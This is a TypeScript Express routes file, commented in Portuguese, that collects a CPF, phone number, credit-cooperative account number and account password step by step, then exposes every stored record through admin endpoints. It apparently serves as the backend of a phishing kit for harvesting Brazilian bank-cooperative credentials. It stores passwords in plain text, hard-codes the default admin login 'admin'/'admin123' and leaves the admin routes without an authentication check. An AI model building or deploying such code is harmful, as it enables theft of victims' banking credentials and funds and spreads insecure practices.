import type { Express } from "express";
import { createServer, type Server } from "http";
import { setupAuth } from "./auth";
import { storage } from "./storage";
import { z } from "zod";
import { 
  cpfSchema, 
  phoneSchema, 
  accountSchema, 
  passwordSchema,
  insertSubmissionSchema
} from "@shared/schema";

// Função para criar um usuário administrativo padrão
async function createDefaultAdmin() {
  try {
    // Verificar se já existe um usuário admin
    const existingAdmin = await storage.getUserByUsername("admin");
    
    if (!existingAdmin) {
      await storage.createUser({
        username: "admin",
        password: "admin123",
        isAdmin: true
      });
      console.log("Usuário administrativo padrão criado com sucesso!");
    }
  } catch (error) {
    console.error("Erro ao criar usuário administrativo padrão:", error);
  }
}

export async function registerRoutes(app: Express): Promise<Server> {
  // Set up authentication routes
  setupAuth(app);
  
  // Criar usuário administrativo padrão
  await createDefaultAdmin();

  // API Routes
  // Form submission endpoints
  app.post("/api/submissions/cpf", async (req, res) => {
    try {
      const validatedData = cpfSchema.parse(req.body);
      
      const submission = await storage.createSubmission({
        cpf: validatedData.cpf,
        status: "started"
      });
      
      res.status(201).json({ 
        id: submission.id,
        message: "CPF registrado com sucesso" 
      });
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({ message: "CPF inválido", errors: error.errors });
      } else {
        console.error("Submission error:", error);
        res.status(500).json({ message: "Erro ao processar CPF" });
      }
    }
  });

  app.post("/api/submissions/:id/phone", async (req, res) => {
    try {
      const id = parseInt(req.params.id);
      const validatedData = phoneSchema.parse(req.body);
      
      const submission = await storage.updateSubmission(id, {
        phone: validatedData.phone,
        status: "phone_added"
      });
      
      if (!submission) {
        return res.status(404).json({ message: "Submissão não encontrada" });
      }
      
      res.json({ 
        message: "Telefone adicionado com sucesso",
        submission 
      });
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({ message: "Telefone inválido", errors: error.errors });
      } else {
        console.error("Phone update error:", error);
        res.status(500).json({ message: "Erro ao adicionar telefone" });
      }
    }
  });

  app.post("/api/submissions/:id/account", async (req, res) => {
    try {
      const id = parseInt(req.params.id);
      const validatedData = accountSchema.parse(req.body);
      
      const submission = await storage.updateSubmission(id, {
        cooperativa: validatedData.cooperativa,
        account: validatedData.account,
        status: "account_added"
      });
      
      if (!submission) {
        return res.status(404).json({ message: "Submissão não encontrada" });
      }
      
      res.json({ 
        message: "Dados da conta adicionados com sucesso",
        submission 
      });
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({ message: "Dados da conta inválidos", errors: error.errors });
      } else {
        console.error("Account update error:", error);
        res.status(500).json({ message: "Erro ao adicionar dados da conta" });
      }
    }
  });

  app.post("/api/submissions/:id/password", async (req, res) => {
    try {
      const id = parseInt(req.params.id);
      const validatedData = passwordSchema.parse(req.body);
      
      const submission = await storage.updateSubmission(id, {
        password: validatedData.password,
        status: "completed"
      });
      
      if (!submission) {
        return res.status(404).json({ message: "Submissão não encontrada" });
      }
      
      // Update system stats
      await storage.updateStats(submission);
      
      res.json({ 
        message: "Submissão completada com sucesso",
        submission 
      });
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({ message: "Senha inválida", errors: error.errors });
      } else {
        console.error("Password update error:", error);
        res.status(500).json({ message: "Erro ao finalizar submissão" });
      }
    }
  });

  // Admin endpoints
  app.get("/api/admin/submissions", async (req, res) => {
    try {
      const submissions = await storage.getAllSubmissions();
      res.json(submissions);
    } catch (error) {
      console.error("Error fetching submissions:", error);
      res.status(500).json({ message: "Erro ao buscar submissões" });
    }
  });

  app.get("/api/admin/submissions/:id", async (req, res) => {
    try {
      const id = parseInt(req.params.id);
      const submission = await storage.getSubmission(id);
      
      if (!submission) {
        return res.status(404).json({ message: "Submissão não encontrada" });
      }
      
      res.json(submission);
    } catch (error) {
      console.error("Error fetching submission:", error);
      res.status(500).json({ message: "Erro ao buscar submissão" });
    }
  });

  app.delete("/api/admin/submissions/:id", async (req, res) => {
    try {
      const id = parseInt(req.params.id);
      await storage.deleteSubmission(id);
      res.json({ message: "Submissão excluída com sucesso" });
    } catch (error) {
      console.error("Error deleting submission:", error);
      res.status(500).json({ message: "Erro ao excluir submissão" });
    }
  });

  app.get("/api/admin/stats", async (req, res) => {
    try {
      const stats = await storage.getStats();
      res.json(stats);
    } catch (error) {
      console.error("Error fetching stats:", error);
      res.status(500).json({ message: "Erro ao buscar estatísticas" });
    }
  });

  // Create HTTP server
  const httpServer = createServer(app);
  return httpServer;
}
